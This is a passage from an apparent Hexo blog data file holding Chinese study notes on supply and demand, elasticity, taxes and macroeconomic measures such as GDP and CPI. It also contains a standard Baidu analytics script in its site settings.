style=\"text-align:center\">8</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥5.00</td>\n<td style=\"text-align:center\">6</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥6.00</td>\n<td style=\"text-align:center\">4</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"需求曲线\"><a href=\"#需求曲线\" class=\"headerlink\" title=\"需求曲线\"></a>需求曲线</h3><h4 id=\"定义-2\"><a href=\"#定义-2\" class=\"headerlink\" title=\"定义\"></a>定义</h4><p>由需求表的价格为y轴，市场需求量为x轴画的曲线</p>\n<blockquote>\n<p>市场需求量是所有买者在每一价格水平下需求量的总和</p>\n</blockquote>\n<h4 id=\"曲线的移动\"><a href=\"#曲线的移动\" class=\"headerlink\" title=\"曲线的移动\"></a>曲线的移动</h4><ul>\n<li>需求增加：使每一价格水平下的需求量增加的任何变动都会使需求曲线向右移动</li>\n<li>需求减少：使每一价格水平下的需求量减少的任何变动都会使需求曲线向左移动</li>\n</ul>\n<blockquote>\n<p>区分于</p>\n<ul>\n<li>需求量增加/减少</li>\n<li>价格增加/减少</li>\n</ul>\n</blockquote>\n<ul>\n<li>买者数量增加：曲线右移</li>\n<li>收入<ul>\n<li>正常物品：需求量与收入呈正比</li>\n<li>低档物品：需求量与收入呈反比</li>\n</ul>\n</li>\n<li>相关物品的价格<ul>\n<li>替代品：一种物品价格上升引起另一种物品需求量增加</li>\n<li>互补品：一种物品价格上升引起另一种物品需求量减少</li>\n</ul>\n</li>\n<li>嗜好</li>\n<li>预期</li>\n</ul>\n<h2 id=\"供给\"><a href=\"#供给\" class=\"headerlink\" title=\"供给\"></a>供给</h2><h3 id=\"定义-3\"><a href=\"#定义-3\" class=\"headerlink\" title=\"定义\"></a>定义</h3><p>一种物品的供给量，是卖者<em>愿意</em>并且<em>能够出售</em>的一种物品的数量。</p>\n<h3 id=\"供给定理\"><a href=\"#供给定理\" class=\"headerlink\" title=\"供给定理\"></a>供给定理</h3><p>在其他条件不变时，一种物品价格上升，该物品供给量增加；一种物品价格下降，该物品供给量减少。换言之，在其他条件不变时，物品价格与供给量之间呈正相关关系。</p>\n<h3 id=\"供给表\"><a href=\"#供给表\" class=\"headerlink\" title=\"供给表\"></a>供给表</h3><p>在其他条件保持不变情况下，一种物品的价格与供给量之间关系的表格</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">咖啡价格</th>\n<th style=\"text-align:center\">供给量</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">￥0.00</td>\n<td style=\"text-align:center\">0</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥1.00</td>\n<td style=\"text-align:center\">3</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥2.00</td>\n<td style=\"text-align:center\">6</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥3.00</td>\n<td style=\"text-align:center\">9</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥4.00</td>\n<td style=\"text-align:center\">12</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥5.00</td>\n<td style=\"text-align:center\">15</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥6.00</td>\n<td style=\"text-align:center\">18</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"供给曲线\"><a href=\"#供给曲线\" class=\"headerlink\" title=\"供给曲线\"></a>供给曲线</h3><p>…</p>\n<blockquote>\n<p>市场供给量：…</p>\n</blockquote>\n<h4 id=\"移动\"><a href=\"#移动\" class=\"headerlink\" title=\"移动\"></a>移动</h4><ul>\n<li>供给增加：使每一价格水平的供给量都增加的任何一种变动，都会使供给曲线向右移动</li>\n<li>供给减少：使每一价格水平的供给量都减少的任何一种变动，都会使供给曲线向左移动</li>\n</ul>\n<blockquote>\n<p>区分于</p>\n<ul>\n<li>供给量增加/减少</li>\n<li>价格增加/减少</li>\n</ul>\n</blockquote>\n<ul>\n<li>卖者数量增加：右移</li>\n<li>投入品价格（成本）下降：右移</li>\n<li>技术改进：右移</li>\n<li>预期：（奇货可居）</li>\n</ul>\n<h2 id=\"需求与供给的结合\"><a href=\"#需求与供给的结合\" class=\"headerlink\" title=\"需求与供给的结合\"></a>需求与供给的结合</h2><p>需求曲线和供给曲线交点，价格与市场均衡</p>\n<h4 id=\"均衡-：\"><a href=\"#均衡-：\" class=\"headerlink\" title=\"均衡 ：\"></a>均衡 ：</h4><p>各种力量处于平衡的状态</p>\n<h4 id=\"市场均衡：\"><a href=\"#市场均衡：\" class=\"headerlink\" title=\"市场均衡：\"></a>市场均衡：</h4><p>商品的需求价格等于供给价格，商品的需求数量等于供给数量</p>\n<h4 id=\"均衡价格（市场出清价格）：\"><a href=\"#均衡价格（市场出清价格）：\" class=\"headerlink\" title=\"均衡价格（市场出清价格）：\"></a>均衡价格（市场出清价格）：</h4><p>使供给与需求平衡的价格。</p>\n<h4 id=\"均衡数量：\"><a href=\"#均衡数量：\" class=\"headerlink\" title=\"均衡数量：\"></a>均衡数量：</h4><p>均衡价格下的商品供给量和商品需求量。</p>\n<h3 id=\"过剩（超额供给）\"><a href=\"#过剩（超额供给）\" class=\"headerlink\" title=\"过剩（超额供给）\"></a>过剩（超额供给）</h3><p>市场价格高于均衡价格</p>\n<p>供给量大于需求量的状态（即供过于求的状态）</p>\n<h3 id=\"短缺（超额需求）\"><a href=\"#短缺（超额需求）\" class=\"headerlink\" title=\"短缺（超额需求）\"></a>短缺（超额需求）</h3><p>市场价格低于均衡价格</p>\n<p>需求量大于供给量的状态（即供不应求的状态）</p>\n<h3 id=\"供求定理\"><a href=\"#供求定理\" class=\"headerlink\" title=\"供求定理\"></a>供求定理</h3><p>任何一种物品的价格调整都会使该物品的供给与需求达到平衡。</p>\n<p>价格调整过程即为市场配置稀缺资源的过程。</p>\n<h2 id=\"价格配置资源（小结）\"><a href=\"#价格配置资源（小结）\" class=\"headerlink\" title=\"价格配置资源（小结）\"></a>价格配置资源（小结）</h2><ul>\n<li>价格是引导资源配置的信号</li>\n<li>经济学家使用供给与需求模型来分析竞争市场</li>\n<li><strong>向右下方倾斜的需求曲线</strong>反应了需求定理</li>\n<li><strong>向右上方倾斜的供给曲线</strong>反应了供给定理</li>\n<li>供给曲线与需求曲线相交决定了市场均衡</li>\n<li>当市场价格高于均衡价格时，存在物品的过剩，引起市场价格下降。</li>\n<li>当市场价格低于均衡价格时，存在物品的短缺，引起市场价格上升</li>\n<li>在市场经济中，价格是引导经济决策，从而配置稀缺资源的信号。</li>\n<li>微观经济学有时也称为<strong>价格理论</strong></li>\n<li>为了分析某个事件如何影响一个市场，我们用供求图来考察该事件对均衡价格和均衡数量的影响。我们遵循三个步骤进行：<ol>\n<li>确定该事件是使供给曲线移动，还是使需求曲线移动（还是使两者都移动）</li>\n<li>确定曲线移动的方向</li>\n<li>比较新均衡与原来的均衡</li>\n</ol>\n</li>\n</ul>\n<h1 id=\"第4章-供需弹性及其应用\"><a href=\"#第4章-供需弹性及其应用\" class=\"headerlink\" title=\"第4章 供需弹性及其应用\"></a>第4章 供需弹性及其应用</h1><h2 id=\"弹性\"><a href=\"#弹性\" class=\"headerlink\" title=\"弹性\"></a>弹性</h2><p>衡量一个变量对另一个变量反应程度的指标。</p>\n<h3 id=\"gt\"><a href=\"#gt\" class=\"headerlink\" title=\"=&gt;\"></a>=&gt;</h3><ul>\n<li>需求弹性是衡量需求量对其某种决定因素的反应程度的指标。</li>\n<li>供给弹性是衡量供给量对其某种决定因素的反应程度的指标。</li>\n</ul>\n<h2 id=\"需求弹性\"><a href=\"#需求弹性\" class=\"headerlink\" title=\"需求弹性\"></a>需求弹性</h2><p>需求价格弹性：衡量一种物品需求量对其价格变动的反应程度</p>\n<h3 id=\"计算\"><a href=\"#计算\" class=\"headerlink\" title=\"计算\"></a>计算</h3><p>需求价格弹性 = 需求量变动百分比 / 价格变动百分比</p>\n<blockquote>\n<p>变动百分比 = (终值 - 初始值) / 变动前后平均值（中点法）</p>\n<p>按照经济学惯例，我们去掉负号，把所有需求价格弹性表示为正数，即取弹性的绝对值。</p>\n</blockquote>\n<h3 id=\"需求价格弹性的决定因素\"><a href=\"#需求价格弹性的决定因素\" class=\"headerlink\" title=\"需求价格弹性的决定因素\"></a>需求价格弹性的决定因素</h3><ul>\n<li>有“相近替代品”的物品的需求往往较富有弹性（相近替代品的可获得性）</li>\n<li>“范围小的市场”的需求价格弹性往往大于“范围大的市场”的需求价格弹性（市场范围的划定）</li>\n<li>奢侈品的需求价格弹性要大于必需品的需求价格弹性（奢侈品和必需品）</li>\n<li>相对于短期，物品的需求往往在长期更富有价格弹性（时间长短）</li>\n</ul>\n<h3 id=\"需求价格弹性与各种需求曲线之间的关系\"><a href=\"#需求价格弹性与各种需求曲线之间的关系\" class=\"headerlink\" title=\"需求价格弹性与各种需求曲线之间的关系\"></a>需求价格弹性与各种需求曲线之间的关系</h3><p>需求曲线越平坦，需求价格弹性越大</p>\n<p>由此关系可将需求曲线分为</p>\n<ul>\n<li>完全无弹性的需求曲线（缺乏弹性的一个极端例子）[弹性=0，需求曲线竖直]</li>\n<li>缺乏弹性的需求曲线[弹性&lt;1]</li>\n<li>单位弹性的需求曲线[弹性=1]</li>\n<li>富有弹性的需求曲线[弹性&gt;1]</li>\n<li>完全有弹性的需求曲线（富有弹性的一个极端例子）[弹性无穷大，需求曲线水平]</li>\n</ul>\n<blockquote>\n<p>注意：线性需求曲线的斜率为常数，但它的弹性不是常数</p>\n</blockquote>\n<h3 id=\"总收益与需求价格弹性\"><a href=\"#总收益与需求价格弹性\" class=\"headerlink\" title=\"总收益与需求价格弹性\"></a>总收益与需求价格弹性</h3><p>###￥ 总收益</p>\n<p>某种物品的买者支付从而卖者得到的货币量。</p>\n<p>在任何一个市场上，总收益 = P x Q </p>\n<h4 id=\"价格变动对总收益的影响取决于需求价格弹性\"><a href=\"#价格变动对总收益的影响取决于需求价格弹性\" class=\"headerlink\" title=\"价格变动对总收益的影响取决于需求价格弹性\"></a>价格变动对总收益的影响取决于需求价格弹性</h4><p>当需求富有弹性时，价格和总收益反方向变化。<br>当需求缺乏弹性时，价格和总收益同方向变动。<br>当需求是单位弹性时，价格变动，总收益不变。</p>\n<h3 id=\"其他需求弹性\"><a href=\"#其他需求弹性\" class=\"headerlink\" title=\"其他需求弹性\"></a>其他需求弹性</h3><ul>\n<li>需求收入弹性：衡量消费者收入变动时需求量如何变动。</li>\n<li>需求的交叉价格弹性：衡量一种物品需求量对另外一种物品价格变动的反应程度<br>需求的交叉价格弹性<br>= 物品B的需求量变动百分比<br>/ 物品A的价格变动百分比</li>\n</ul>\n<h2 id=\"供给价格弹性\"><a href=\"#供给价格弹性\" class=\"headerlink\" title=\"供给价格弹性\"></a>供给价格弹性</h2><p>衡量一种物品供给量对其价格变动的反应程度</p>\n<blockquote>\n<p>内容基本同上需求部分</p>\n</blockquote>\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><ul>\n<li>弹性衡量需求量或供给量对其一个影响因素变动的反应程度</li>\n<li>需求价格弹性衡量需求量对价格变动的反应程度。如果弹性小于1，需求缺乏弹性；如果大于1，需求富有弹性</li>\n<li>对于缺乏弹性的需求曲线，其总收益随着价格的上升而增加。对于富有弹性的需求曲线，其总收益随着价格的上升而减少</li>\n<li>如果某种物品<ul>\n<li>没有相近的替代品</li>\n<li>是必需品而不是奢侈品</li>\n<li>市场范围大</li>\n<li>在短期内</li>\n<li>那么，这种物品就更倾向于缺乏弹性</li>\n</ul>\n</li>\n<li>供给价格弹性衡量的是供给量对价格变动的反应程度。如果弹性小于1，供给缺乏弹性。如果弹性大于1，供给富有弹性</li>\n<li>供给价格弹性在长期中比在短期中更富有弹性</li>\n<li>需求收入弹性衡量的是需求量对消费者收入变动的反应程度</li>\n<li>需求的交叉价格弹性衡量一种物品需求量对另一种物品价格变动的反应程度</li>\n</ul>\n<h1 id=\"第5章-供给、需求与政府政策\"><a href=\"#第5章-供给、需求与政府政策\" class=\"headerlink\" title=\"第5章 供给、需求与政府政策\"></a>第5章 供给、需求与政府政策</h1><ul>\n<li>价格上限：出售一种物品或服务的法定最高价格，比如租金控制</li>\n<li>价格下限：出售一种物品或服务的法定最低价格，比如最低工资 </li>\n</ul>\n<blockquote>\n<p>价格上限高于均衡价格时，价格上限是非限制性的。（非限制性的价格上限）</p>\n<p>市场力量自然而然地使经济向均衡变动，而且<em>非限制性的价格上限对市场结果没有影响。</em></p>\n<p>而限制性的价格上限将导致了需求量大于供给量，因而出现短缺</p>\n<p>同理，限制性的价格下限将导致供给量大于需求量，因而引起过剩</p>\n</blockquote>\n<h2 id=\"短缺与配给机制\"><a href=\"#短缺与配给机制\" class=\"headerlink\" title=\"短缺与配给机制\"></a>短缺与配给机制</h2><p>面临短缺时，卖者必须在买者之间配给稀缺物品 </p>\n<p>配给机制：（1）排长队  （2）根据卖者的偏好</p>\n<blockquote>\n<p>这些配件机制既可能是不公平的，也是无效率的：因为物品并不一定会卖给对它评价最高的买者</p>\n<p>一个自由竞争市场中的配给机制既有效率（物品卖给对它评价最高的买者），也是客观的（公平的）</p>\n<p>实际上，决策者进行价格控制的目标往往是想帮助穷人，但往往却伤害了那些它本想帮助的人。比如：最低工资法会增加一些工人的收入，但也是其他工人成为失业者。</p>\n</blockquote>\n<h2 id=\"税收\"><a href=\"#税收\" class=\"headerlink\" title=\"税收\"></a>税收</h2><p>对买者征税使需求曲线向下移动，其移动幅度为税收量 （要保持买者的需求量需要降低税收价格的市场价，因此下移[需求曲线的y轴是卖者的售价]）</p>\n<p>对卖者征税使供给曲线向上移动，移动幅度为税收量（与上同理）</p>\n<h3 id=\"税收归宿\"><a href=\"#税收归宿\" class=\"headerlink\" title=\"税收归宿\"></a>税收归宿</h3><p>税收负担在市场参与者之间进行分配的方式</p>\n<p>即，税收总量多少，买者分担多少，卖者分担多少</p>\n<blockquote>\n<p>无论对买者还是卖者征税，最后的市场价格、均衡数量以及税收归宿都是<em>相同</em>的</p>\n</blockquote>\n<h3 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h3><ul>\n<li>税收抑制了市场活动。当对一种物品征税时，该物品在新均衡时的销售量减少了。</li>\n<li>买者与卖者分摊了税收负担。在新均衡时，买者为该物品支付的更多了，而卖者得到的更少了。</li>\n<li>对买者征税和对卖者征税是相同的。对买者征税和对卖者征税的唯一区别是谁把钱交给了政府。</li>\n</ul>\n<h3 id=\"弹性与税收\"><a href=\"#弹性与税收\" class=\"headerlink\" title=\"弹性与税收\"></a>弹性与税收</h3><ul>\n<li>供给相对于需求更富有弹性，则买者承担了大部分税负</li>\n<li>需求相对于供给更富有弹性，则卖者承担了大部分税负</li>\n</ul>\n<p>=&gt; </p>\n<p>税收负担更多地落在缺乏弹性的市场一方身上。</p>"},{"title":"第六讲——宏观经济学数据和国民收入决定","_content":"\n> 明天考选修，贴个[哭]\n\n<!-- more -->\n\n## 国民收入核算\n\n* GDP:国内生产总值\n* GNP:国民生产总值\n\n> 中国诺基亚公司归芬兰人所有，该公司在中国经营得到的利润，虽是中国GDP一部分，但不被统计为中国GNP，而应归入芬兰GNP。中国海尔在美国工厂的利润，应作为美国GDP一部分，但应被统计为中国的GNP。\n\n* NNP：国内生产净值（国内生产总值减去固定资产折旧）\n* NI：国民收入（国民收入要加上折旧、间接税等才形成GDP）\n* 其他：\n    * PI：个人收入\n    * PDI：个人可支配收入（PI扣除税收、养老保险等）\n\n---\n\n**地下经济**：所有合法但却未申报的经济活动。\n\n**非市场活动**：居民在家庭内生产和消费，而没有进入市场的产品与劳务的价值。\n\n---\n\n核算方法：\n* 支出法\n    * 使用 消费（C），投资（I），政府购买（G），净出口（NX）\n    > **净出口**：出口减去进口得到的差额，表示本国最终产品有多少通过外国人支出而实现其市场价值。\n* 收入法\n    * 使用 劳动者报酬、生产税净额、固定资产折旧、营业盈余\n    > **生产税净额**：生产税费（因为从事生产活动使用生产要素如固定资产、土地、劳动力向政府缴纳的各种税金、附加费和规费）减去生产补贴后的差额。\n    > **固定资产折旧**：为了弥补固定资产在生产过程中的价值损耗而提取的价值。\n* 部门法（生产法）\n    * 依据提供产品与劳务各部门增加值计算GDP，从生产角度反映了GDP来源。政府部门劳务按其收入计算。\n    * 我国现行统计制度，把国民经济分为农业，采掘业，化学工业，金融保险业等17个部门进行生产或部门法统计。\n\n---\n\n* 实际GDP（Real GDP): 按基期不变价格评价的物品与劳务的产值。\n* 名义GDP（Nominal  GDP）：按现期价格计算的物品与劳务的产值。\n\n> 实际GDP排除通货膨胀等的影响\n\n**GDP消胀指数**：用名义GDP与实际GDP的比值计算的物价水平衡量指标。\n\n---\n\n**总需求**（AD）：整个社会对产品与劳务需求的总和，包括\n* 消费：居民对产品或服务的需求或支出\n* 投资：厂商对投资品的需求或支出\n* 政府支出：政府对各种产品与服务的需求或支出\n* 净出口：外国居民对本国产品或服务的需求\n\n**总供给**（AS）：全部产品与服务供给/销售的总和（用货币衡量）\n\n---\n\n**物价指数**：现期某些物品的价值与基期同样物品价值的比率\n\n**通货膨胀率**：现期物价指数较前期变动的百分比。\n\n**消费物价指数**（CPI）：是衡量消费者购买的物品与劳务的平均物价水平的物价指数。\n\n计算：\n\n1. 固定篮子，确定选择哪些物品与劳务计算CPI，以及各种物品的权重。\n\n    4个热狗，2 个烤地瓜\n\t\n2. 找出各年每种物品的价格。\n\n|年份|热狗的价格（￥）|烤地瓜的价格（￥）|\n|:--:|:--:|:--:|\n|2001|1 |2|           \n|2002|2 |3|\n|2003|3 |4|\n\n3. 计算一篮子物品的支出\n\n|年份|一篮子物品的费用|\n|:--:|:----:|\n|2001|（每个热狗1￥*4个热狗）+ （每个烤地瓜2￥*2个烤地瓜）= 8￥|\n|2002|（每个热狗2￥*4个热狗）+ （每个烤地瓜3￥*2个烤地瓜）=14￥|\n|2003|（每个热狗3￥*4个热狗）+ （每个烤地瓜4￥*2个烤地瓜）=20￥|\n\n4. 选择某一年为基年，计算各年的CPI（以2001年为基年）\n\n|年份|消费物价指数|\n|:---:|:--------------------:|\n|2001|（8/ 8）*100 = 100|\n|2002|（14/ 8）*100 = 175|\n|2003|（20/8）*100 = 250|\n\n5. 用消费物价指数计算自上一年来的通货膨胀率\n\n|年份|通货膨胀率|\n|:-----:|:------:|\n|2002|（175-100）/100= 75%|\n|2003|（250-175）/175=43%|\n","source":"_posts/第六讲——宏观经济学数据和国民收入决定.md","raw":"---\n\ntitle: 第六讲——宏观经济学数据和国民收入决定\n\n---\n\n> 明天考选修，贴个[哭]\n\n<!-- more -->\n\n## 国民收入核算\n\n* GDP:国内生产总值\n* GNP:国民生产总值\n\n> 中国诺基亚公司归芬兰人所有，该公司在中国经营得到的利润，虽是中国GDP一部分，但不被统计为中国GNP，而应归入芬兰GNP。中国海尔在美国工厂的利润，应作为美国GDP一部分，但应被统计为中国的GNP。\n\n* NNP：国内生产净值（国内生产总值减去固定资产折旧）\n* NI：国民收入（国民收入要加上折旧、间接税等才形成GDP）\n* 其他：\n    * PI：个人收入\n    * PDI：个人可支配收入（PI扣除税收、养老保险等）\n\n---\n\n**地下经济**：所有合法但却未申报的经济活动。\n\n**非市场活动**：居民在家庭内生产和消费，而没有进入市场的产品与劳务的价值。\n\n---\n\n核算方法：\n* 支出法\n    * 使用 消费（C），投资（I），政府购买（G），净出口（NX）\n    > **净出口**：出口减去进口得到的差额，表示本国最终产品有多少通过外国人支出而实现其市场价值。\n* 收入法\n    * 使用 劳动者报酬、生产税净额、固定资产折旧、营业盈余\n    > **生产税净额**：生产税费（因为从事生产活动使用生产要素如固定资产、土地、劳动力向政府缴纳的各种税金、附加费和规费）减去生产补贴后的差额。\n    > **固定资产折旧**：为了弥补固定资产在生产过程中的价值损耗而提取的价值。\n* 部门法（生产法）\n    * 依据提供产品与劳务各部门增加值计算GDP，从生产角度反映了GDP来源。政府部门劳务按其收入计算。\n    * 我国现行统计制度，把国民经济分为农业，采掘业，化学工业，金融保险业等17个部门进行生产或部门法统计。\n\n---\n\n* 实际GDP（Real GDP): 按基期不变价格评价的物品与劳务的产值。\n* 名义GDP（Nominal  GDP）：按现期价格计算的物品与劳务的产值。\n\n> 实际GDP排除通货膨胀等的影响\n\n**GDP消胀指数**：用名义GDP与实际GDP的比值计算的物价水平衡量指标。\n\n---\n\n**总需求**（AD）：整个社会对产品与劳务需求的总和，包括\n* 消费：居民对产品或服务的需求或支出\n* 投资：厂商对投资品的需求或支出\n* 政府支出：政府对各种产品与服务的需求或支出\n* 净出口：外国居民对本国产品或服务的需求\n\n**总供给**（AS）：全部产品与服务供给/销售的总和（用货币衡量）\n\n---\n\n**物价指数**：现期某些物品的价值与基期同样物品价值的比率\n\n**通货膨胀率**：现期物价指数较前期变动的百分比。\n\n**消费物价指数**（CPI）：是衡量消费者购买的物品与劳务的平均物价水平的物价指数。\n\n计算：\n\n1. 固定篮子，确定选择哪些物品与劳务计算CPI，以及各种物品的权重。\n\n    4个热狗，2 个烤地瓜\n\t\n2. 找出各年每种物品的价格。\n\n|年份|热狗的价格（￥）|烤地瓜的价格（￥）|\n|:--:|:--:|:--:|\n|2001|1 |2|           \n|2002|2 |3|\n|2003|3 |4|\n\n3. 计算一篮子物品的支出\n\n|年份|一篮子物品的费用|\n|:--:|:----:|\n|2001|（每个热狗1￥*4个热狗）+ （每个烤地瓜2￥*2个烤地瓜）= 8￥|\n|2002|（每个热狗2￥*4个热狗）+ （每个烤地瓜3￥*2个烤地瓜）=14￥|\n|2003|（每个热狗3￥*4个热狗）+ （每个烤地瓜4￥*2个烤地瓜）=20￥|\n\n4. 选择某一年为基年，计算各年的CPI（以2001年为基年）\n\n|年份|消费物价指数|\n|:---:|:--------------------:|\n|2001|（8/ 8）*100 = 100|\n|2002|（14/ 8）*100 = 175|\n|2003|（20/8）*100 = 250|\n\n5. 用消费物价指数计算自上一年来的通货膨胀率\n\n|年份|通货膨胀率|\n|:-----:|:------:|\n|2002|（175-100）/100= 75%|\n|2003|（250-175）/175=43%|\n","slug":"第六讲——宏观经济学数据和国民收入决定","published":1,"date":"2017-05-07T12:33:37.692Z","updated":"2017-05-07T12:32:30.854Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s4g000kl8slqssvdh89","content":"<blockquote>\n<p>明天考选修，贴个[哭]</p>\n</blockquote>\n<a id=\"more\"></a>\n<h2 id=\"国民收入核算\"><a href=\"#国民收入核算\" class=\"headerlink\" title=\"国民收入核算\"></a>国民收入核算</h2><ul>\n<li>GDP:国内生产总值</li>\n<li>GNP:国民生产总值</li>\n</ul>\n<blockquote>\n<p>中国诺基亚公司归芬兰人所有，该公司在中国经营得到的利润，虽是中国GDP一部分，但不被统计为中国GNP，而应归入芬兰GNP。中国海尔在美国工厂的利润，应作为美国GDP一部分，但应被统计为中国的GNP。</p>\n</blockquote>\n<ul>\n<li>NNP：国内生产净值（国内生产总值减去固定资产折旧）</li>\n<li>NI：国民收入（国民收入要加上折旧、间接税等才形成GDP）</li>\n<li>其他：<ul>\n<li>PI：个人收入</li>\n<li>PDI：个人可支配收入（PI扣除税收、养老保险等）</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>地下经济</strong>：所有合法但却未申报的经济活动。</p>\n<p><strong>非市场活动</strong>：居民在家庭内生产和消费，而没有进入市场的产品与劳务的价值。</p>\n<hr>\n<p>核算方法：</p>\n<ul>\n<li>支出法<ul>\n<li>使用 消费（C），投资（I），政府购买（G），净出口（NX）<blockquote>\n<p><strong>净出口</strong>：出口减去进口得到的差额，表示本国最终产品有多少通过外国人支出而实现其市场价值。</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>收入法<ul>\n<li>使用 劳动者报酬、生产税净额、固定资产折旧、营业盈余<blockquote>\n<p><strong>生产税净额</strong>：生产税费（因为从事生产活动使用生产要素如固定资产、土地、劳动力向政府缴纳的各种税金、附加费和规费）减去生产补贴后的差额。<br><strong>固定资产折旧</strong>：为了弥补固定资产在生产过程中的价值损耗而提取的价值。</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>部门法（生产法）<ul>\n<li>依据提供产品与劳务各部门增加值计算GDP，从生产角度反映了GDP来源。政府部门劳务按其收入计算。</li>\n<li>我国现行统计制度，把国民经济分为农业，采掘业，化学工业，金融保险业等17个部门进行生产或部门法统计。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<ul>\n<li>实际GDP（Real GDP): 按基期不变价格评价的物品与劳务的产值。</li>\n<li>名义GDP（Nominal  GDP）：按现期价格计算的物品与劳务的产值。</li>\n</ul>\n<blockquote>\n<p>实际GDP排除通货膨胀等的影响</p>\n</blockquote>\n<p><strong>GDP消胀指数</strong>：用名义GDP与实际GDP的比值计算的物价水平衡量指标。</p>\n<hr>\n<p><strong>总需求</strong>（AD）：整个社会对产品与劳务需求的总和，包括</p>\n<ul>\n<li>消费：居民对产品或服务的需求或支出</li>\n<li>投资：厂商对投资品的需求或支出</li>\n<li>政府支出：政府对各种产品与服务的需求或支出</li>\n<li>净出口：外国居民对本国产品或服务的需求</li>\n</ul>\n<p><strong>总供给</strong>（AS）：全部产品与服务供给/销售的总和（用货币衡量）</p>\n<hr>\n<p><strong>物价指数</strong>：现期某些物品的价值与基期同样物品价值的比率</p>\n<p><strong>通货膨胀率</strong>：现期物价指数较前期变动的百分比。</p>\n<p><strong>消费物价指数</strong>（CPI）：是衡量消费者购买的物品与劳务的平均物价水平的物价指数。</p>\n<p>计算：</p>\n<ol>\n<li><p>固定篮子，确定选择哪些物品与劳务计算CPI，以及各种物品的权重。</p>\n<p> 4个热狗，2 个烤地瓜</p>\n</li>\n<li><p>找出各年每种物品的价格。</p>\n</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">年份</th>\n<th style=\"text-align:center\">热狗的价格（￥）</th>\n<th style=\"text-align:center\">烤地瓜的价格（￥）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2001</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">2</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2002</td>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">3</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2003</td>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">4</td>\n</tr>\n</tbody>\n</table>\n<ol>\n<li>计算一篮子物品的支出</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">年份</th>\n<th style=\"text-align:center\">一篮子物品的费用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2001</td>\n<td style=\"text-align:center\">（每个热狗1￥<em>4个热狗）+ （每个烤地瓜2￥</em>2个烤地瓜）= 8￥</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2002</td>\n<td style=\"text-align:center\">（每个热狗2￥<em>4个热狗）+ （每个烤地瓜3￥</em>2个烤地瓜）=14￥</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2003</td>\n<td style=\"text-align:center\">（每个热狗3￥<em>4个热狗）+ （每个烤地瓜4￥</em>2个烤地瓜）=20￥</td>\n</tr>\n</tbody>\n</table>\n<ol>\n<li>选择某一年为基年，计算各年的CPI（以2001年为基年）</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">年份</th>\n<th style=\"text-align:center\">消费物价指数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2001</td>\n<td style=\"text-align:center\">（8/ 8）*100 = 100</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2002</td>\n<td style=\"text-align:center\">（14/ 8）*100 = 175</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2003</td>\n<td style=\"text-align:center\">（20/8）*100 = 250</td>\n</tr>\n</tbody>\n</table>\n<ol>\n<li>用消费物价指数计算自上一年来的通货膨胀率</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">年份</th>\n<th style=\"text-align:center\">通货膨胀率</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2002</td>\n<td style=\"text-align:center\">（175-100）/100= 75%</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2003</td>\n<td style=\"text-align:center\">（250-175）/175=43%</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<blockquote>\n<p>明天考选修，贴个[哭]</p>\n</blockquote>","more":"<h2 id=\"国民收入核算\"><a href=\"#国民收入核算\" class=\"headerlink\" 